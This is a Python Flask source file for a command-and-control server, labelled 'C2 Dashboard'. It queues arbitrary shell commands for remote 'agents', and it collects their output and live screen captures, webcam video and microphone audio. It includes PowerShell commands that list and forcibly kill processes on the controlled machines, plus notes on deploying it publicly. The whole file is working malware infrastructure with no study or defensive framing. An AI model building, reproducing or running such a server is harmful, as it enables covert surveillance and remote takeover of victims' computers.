from flask import Flask, request, jsonify, redirect, url_for, Response
from collections import defaultdict
import datetime
import time
import queue

app = Flask(__name__)


# --- Web Dashboard HTML ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1, h2 { color: #444; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        #agent-list { list-style-type: none; padding: 0; }
        #agent-list li { background: #e9e9f3; margin-bottom: 10px; padding: 10px; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background-color 0.2s; }
        #agent-list li:hover { background: #dcdcf0; }
        #agent-list li.selected { background: #6a5acd; color: white; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
        input[readonly] { background-color: #eee; }
        button { background-color: #6a5acd; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-right: 10px; }
        button:hover { background-color: #5a4cad; }
        #output-display { background: #222; color: #0f0; font-family: "Courier New", Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 100px; max-height: 400px; overflow-y: auto; }
        .status { margin-top: 10px; padding: 10px; border-radius: 4px; }
        .status.success { background-color: #d4edda; color: #155724; }
        .status.error { background-color: #f8d7da; color: #721c24; }
        #screen-capture { width: 100%; border: 1px solid #ccc; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C2 Control Dashboard</h1>
        
        <h2>Active Agents</h2>
        <ul id="agent-list"><li>No agents have checked in yet.</li></ul>

        <h2>Agent Control</h2>
        <div class="form-group">
            <label for="agent-id">Selected Agent ID</label>
            <input type="text" id="agent-id" readonly placeholder="Click on an agent from the list above">
        </div>

        <div class="form-group">
            <label for="command">Command to Execute</label>
            <input type="text" id="command" placeholder="e.g., whoami">
        </div>
        <button onclick="issueCommand()">Issue Command</button>
        <div id="command-status" class="status" style="display:none;"></div>

        <h2>Command Output</h2>
        <button onclick="getOutput()">Get Output for Selected Agent</button>
        <pre id="output-display">Output will appear here...</pre>

        <h2>Screen Monitoring</h2>
        <button onclick="startScreenStream()">Start Screen Stream</button>
        <button onclick="startCameraStream()">Start Webcam Stream</button>
        <button onclick="stopAllStreams()">Stop All Streams</button>
        
        <h2>Process Management</h2>
        <button onclick="listProcesses()">List Running Processes</button>
        <div class="form-group" style="margin-top: 15px;">
            <label for="process-to-kill">Process Name or PID to Kill</label>
            <input type="text" id="process-to-kill" placeholder="e.g., notepad or 1234">
            <button onclick="killProcess()" style="margin-top: 10px;">Kill Process</button>
        </div>

        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
    </div>

    <script>
        let selectedAgentId = null;
        let outputPollInterval = null;
        let videoWindow = null;
        let cameraWindow = null;
        let audioPlayer = null;

        function selectAgent(element, agentId) {
            const oldAgentId = selectedAgentId;

            // Stop any active polling when switching agents
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            // If there was a previously selected agent, tell it to stop monitoring
            if (oldAgentId && oldAgentId !== agentId) {
                issueCommandInternal(oldAgentId, 'stop-stream');
                issueCommandInternal(oldAgentId, 'stop-audio');
                issueCommandInternal(oldAgentId, 'stop-camera');
            }

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }

            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
            }

            document.querySelectorAll('#agent-list li').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
            
            selectedAgentId = agentId;
            document.getElementById('agent-id').value = agentId;
            document.getElementById('output-display').textContent = 'Output will appear here...';
            document.getElementById('command-status').style.display = 'none';
            
        }

        async function fetchAgents() {
            try {
                const response = await fetch('/agents');
                const agents = await response.json();
                const agentList = document.getElementById('agent-list');
                agentList.innerHTML = '';

                if (Object.keys(agents).length === 0) {
                    agentList.innerHTML = '<li>No agents have checked in yet.</li>';
                    return;
                }

                for (const agentId in agents) {
                    const agent = agents[agentId];
                    const li = document.createElement('li');
                    li.dataset.agentId = agentId;
                    li.onclick = () => selectAgent(li, agentId);
                    
                    const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never';
                    li.innerHTML = `<strong>ID:</strong> ${agentId} <small><strong>Last Seen:</strong> ${lastSeen}</small>`;
                    
                    if (agentId === selectedAgentId) {
                        li.classList.add('selected');
                    }
                    
                    agentList.appendChild(li);
                }
            } catch (error) {
                console.error('Error fetching agents:', error);
                document.getElementById('agent-list').innerHTML = '<li>Error loading agents. Is the server running?</li>';
            }
        }

        async function issueCommand() {
            const command = document.getElementById('command').value;
            const statusDiv = document.getElementById('command-status');

            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            if (!command) { alert('Please enter a command.'); return; }

            // Clear any previous polling interval
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            document.getElementById('output-display').textContent = 'Waiting for command output...';

            try {
                const response = await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: selectedAgentId, command: command })
                });
                const result = await response.json();
                
                statusDiv.style.display = 'block';
                if (response.ok) {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = `Success: ${result.status}`;
                    document.getElementById('command').value = '';

                    // Start polling for the output automatically
                    outputPollInterval = setInterval(getOutput, 3000); // Poll every 3 seconds
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.textContent = `Error: ${result.message}`;
                }
            } catch (error) {
                statusDiv.style.display = 'block';
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Network error. Could not issue command.';
                console.error('Error issuing command:', error);
            }
        }

        async function getOutput() {
            const outputDisplay = document.getElementById('output-display');
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }

            try {
                const response = await fetch(`/get_output/${selectedAgentId}`);
                const result = await response.json();

                if (response.ok) {
                    if (result.output && result.output.length > 0) {
                        outputDisplay.textContent = result.output.join('\\n\\n--- Command Output ---\\n\\n');
                        // Stop polling since we've received the output
                        if (outputPollInterval) {
                            clearInterval(outputPollInterval);
                            outputPollInterval = null;
                        }
                    } else {
                        // If polling is not active, it means this was a manual click with no new output.
                        if (!outputPollInterval) {
                            outputDisplay.textContent = 'No new output from agent.';
                        }
                    }
                } else {
                    outputDisplay.textContent = `Error: ${result.message}`;
                    if (outputPollInterval) {
                        clearInterval(outputPollInterval);
                        outputPollInterval = null;
                    }
                }
            } catch (error) {
                outputDisplay.textContent = 'Network error. Could not retrieve output.';
                console.error('Error getting output:', error);
                if (outputPollInterval) {
                    clearInterval(outputPollInterval);
                    outputPollInterval = null;
                }
            }
        }

        async function startScreenStream() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            // Tell the agent to start both video and audio streams
            await issueCommandInternal(selectedAgentId, 'start-stream'); // Screen stream
            await issueCommandInternal(selectedAgentId, 'start-audio'); // Audio stream

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
            }

            // Open video stream in a popup
            const videoUrl = `/video_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `LiveStream_${selectedAgentId}`;
            const windowFeatures = 'width=800,height=600,resizable=yes,scrollbars=no,status=no';
            videoWindow = window.open(videoUrl, windowName, windowFeatures);

            // Start playing audio on the main page
            audioPlayer = document.getElementById('audio-player');
            const audioUrl = `/audio_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            audioPlayer.style.display = 'block';
            audioPlayer.src = audioUrl;
            audioPlayer.play();
        }

        async function startCameraStream() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }

            await issueCommandInternal(selectedAgentId, 'start-camera');

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
            }

            const cameraUrl = `/camera_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `CameraStream_${selectedAgentId}`;
            const windowFeatures = 'width=640,height=480,resizable=yes,scrollbars=no,status=no';
            cameraWindow = window.open(cameraUrl, windowName, windowFeatures);
        }

        async function stopAllStreams() {
            if (selectedAgentId) {
                // Tell the agent to stop both streams
                await issueCommandInternal(selectedAgentId, 'stop-stream');
                await issueCommandInternal(selectedAgentId, 'stop-audio');
                await issueCommandInternal(selectedAgentId, 'stop-camera');
            }
            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
                audioPlayer.style.display = 'none';
            }
            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }
            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }
        }

        function listProcesses() {
            const commandInput = document.getElementById('command');
            // Select Name, Id, and MainWindowTitle for a more informative process list.
            commandInput.value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
            issueCommand();
        }

        function killProcess() {
            const processInput = document.getElementById('process-to-kill');
            const target = processInput.value.trim();
            if (!target) { alert('Please enter a process name or PID.'); return; }

            let command = '';
            // Check if target is purely numeric to decide between -Id and -Name
            if (/^\d+$/.test(target)) {
                command = `Stop-Process -Id ${target} -Force`;
            } else {
                command = `Stop-Process -Name "${target}" -Force`;
            }
            
            document.getElementById('command').value = command;
            issueCommand();
            processInput.value = ''; // Clear the input after issuing
        }

        // Helper function to issue commands without showing status to the user (for internal tasks)
        async function issueCommandInternal(agentId, command) {
            if (!agentId) return;
            try {
                await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId, command: command })
                });
            } catch (error) {
                console.error(`Error issuing internal command '${command}':`, error);
            }
        }



        // Auto-refresh agents every 5 seconds
        setInterval(fetchAgents, 5000);

        // Initial fetch
        window.onload = fetchAgents;
    </script>
</body>
</html>
"""

# In-memory storage for multi-agent support.
AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": None})

VIDEO_FRAMES = defaultdict(lambda: None)
CAMERA_FRAMES = defaultdict(lambda: None)
AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
# --- Operator-facing endpoints ---

@app.route("/")
def index():
    """
    Redirect root to the dashboard.
    """
    return redirect(url_for('dashboard'))

@app.route("/dashboard")
def dashboard():
    """
    Serves the main HTML dashboard.
    """
    return DASHBOARD_HTML

@app.route("/issue_command", methods=["POST"])
def issue_command():
    """
    Receives a command from the operator and queues it for a specific agent.
    JSON body: { "agent_id": "some_guid", "command": "whoami" }
    """
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")

    if not agent_id or not command:
        return jsonify({"status": "error", "message": "'agent_id' and 'command' are required"}), 400

    AGENTS_DATA[agent_id]["commands"].append(command)
    return jsonify({"status": f"Command queued for agent {agent_id}"})

@app.route("/get_output/<agent_id>", methods=["GET"])
def get_agent_output(agent_id):
    """
    Retrieves and clears the output from a specific agent for the operator.
    """
    if agent_id not in AGENTS_DATA:
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    output_list = AGENTS_DATA[agent_id]["output"]
    AGENTS_DATA[agent_id]["output"] = []  # Clear output after retrieval
    
    return jsonify({"agent_id": agent_id, "output": output_list})

@app.route('/stream/<agent_id>', methods=['POST'])
def stream_in(agent_id):
    """Receives a video frame from an agent."""
    VIDEO_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_video_frames(agent_id):
    """Generator function to stream video frames to the dashboard."""
    while True:
        time.sleep(0.05) # Yield frames at a consistent rate
        frame = VIDEO_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed/<agent_id>')
def video_feed(agent_id):
    """Serves the MJPEG video stream to the dashboard."""
    return Response(generate_video_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/camera/<agent_id>', methods=['POST'])
def camera_in(agent_id):
    """Receives a camera frame from an agent."""
    CAMERA_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_camera_frames(agent_id):
    """Generator function to stream camera frames to the dashboard."""
    last_frame_time = time.time()
    while True:
        time.sleep(0.05)
        frame = CAMERA_FRAMES.get(agent_id)
        if frame:
            last_frame_time = time.time() # Reset timer on new frame
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        elif time.time() - last_frame_time > 10.0: # 10 second timeout
            print(f"Camera stream for {agent_id} timed out. No frames received.")
            break # Stop the generator, close the connection

@app.route('/camera_feed/<agent_id>')
def camera_feed(agent_id):
    """Serves the MJPEG camera stream to the dashboard."""
    return Response(generate_camera_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio/<agent_id>', methods=['POST'])
def audio_in(agent_id):
    """Receives an audio chunk from an agent."""
    AUDIO_CHUNKS[agent_id].put(request.data)
    return "OK", 200

def generate_audio_stream(agent_id):
    """Generator function to stream audio chunks as a WAV file."""
    # WAV header parameters
    CHANNELS = 1
    RATE = 44100
    BITS_PER_SAMPLE = 16
    
    # Construct WAV header for an infinitely long stream.
    # The key is to set the file size and data size to maximum (0xFFFFFFFF)
    # to tell the browser to just keep reading.
    header = bytearray()
    header.extend(b'RIFF')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max file size for streaming
    header.extend(b'WAVE')
    header.extend(b'fmt ')
    header.extend((16).to_bytes(4, 'little')) # Sub-chunk size
    header.extend((1).to_bytes(2, 'little')) # PCM format
    header.extend(CHANNELS.to_bytes(2, 'little'))
    header.extend(RATE.to_bytes(4, 'little'))
    header.extend((RATE * CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(4, 'little')) # Byte rate
    header.extend((CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(2, 'little')) # Block align
    header.extend(BITS_PER_SAMPLE.to_bytes(2, 'little'))
    header.extend(b'data')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max data size for streaming
    yield header

    q = AUDIO_CHUNKS[agent_id]
    while True:
        yield q.get()

@app.route('/audio_feed/<agent_id>')
def audio_feed(agent_id):
    """Serves the WAV audio stream to the dashboard."""
    return Response(generate_audio_stream(agent_id), mimetype='audio/wav')

@app.route("/agents", methods=["GET"])
def get_agents():
    """
    Lists all agents that have checked in and their last seen time.
    """
    return jsonify(AGENTS_DATA)

# --- Agent-facing endpoints ---

@app.route("/get_task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    """
    Called by an agent to get its next command.
    """
    # This serves as a heartbeat, updating the last_seen time.
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"

    commands = AGENTS_DATA[agent_id]["commands"]
    if commands:
        command = commands.pop(0)
        return jsonify({"command": command})
    
    # If no commands, tell the agent to sleep.
    return jsonify({"command": "sleep"})

@app.route("/post_output/<agent_id>", methods=["POST"])
def post_output(agent_id):
    """
    Called by an agent to post the output of an executed command.
    """
    data = request.json
    output = data.get("output")

    if output is None:
        return jsonify({"status": "error", "message": "'output' is required"}), 400

    AGENTS_DATA[agent_id]["output"].append(output)
    return jsonify({"status": "output received"})

if __name__ == "__main__":
    # For deployment on services like Render or Railway, they will use a production WSGI server.
    # The host '0.0.0.0' makes the server accessible externally.
    # IMPORTANT: debug=False is critical for security in a live environment.
    app.run(host="0.0.0.0", port=8080, debug=False)
